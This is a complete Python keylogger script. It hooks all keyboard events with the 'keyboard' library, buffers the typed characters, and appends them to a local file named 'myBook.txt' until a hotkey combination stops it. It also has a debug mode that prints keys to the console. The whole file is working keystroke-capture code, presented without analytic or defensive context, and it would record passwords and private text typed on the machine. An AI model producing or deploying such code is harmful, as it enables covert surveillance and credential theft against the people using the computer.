import keyboard

# File where the Characters get logged
file = 'myBook.txt'
# Buffer for characters
line_buffer = ''
# Buffer Size limit 
CHAR_LIMIT = 10
# Mode 'local' or 'debug'
# 'local': log characters to File
# 'debug': print pressed Keys to console
mode = 'local' #sys.argv[1]



# Debug mode Write single characters 
if mode == 'debug':
    CHAR_LIMIT = 1

def log_debug():
    global line_buffer
    print(line_buffer)
    line_buffer = ''
    return True

def log_local():
    global line_buffer
    f = open(file, "a")
    f.write(line_buffer)
    f.close
    line_buffer = ''
    return True

def log_it():
    global line_buffer, mode
    if mode == "local":
        if len(line_buffer) >= CHAR_LIMIT:
            log_local()
    return True

def key_callback(event):
    global line_buffer

    # event key up 
    if event.event_type == 'up':
        return True
    
    # Debug Mode
    if mode == 'debug':
        line_buffer += event.name
        log_debug()
        return True

    # Key Represention
    if event.name == 'space':
        key_pressed = ' '
    elif event.name == 'enter':
        key_pressed = '\n'
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            l = 1  # Just for place holder
        else:
            return True

    line_buffer += key_pressed
    
    log_it()
    return True

def main(): 
    keyboard.hook(key_callback)
    # To Exit the Keylogger with safing the buffer (ctrl + tab + ende)
    keyboard.wait('ctrl+tab+ende') 
    log_local()
    print("Keylogger stopped.")
    return

if __name__ == '__main__':
    main()
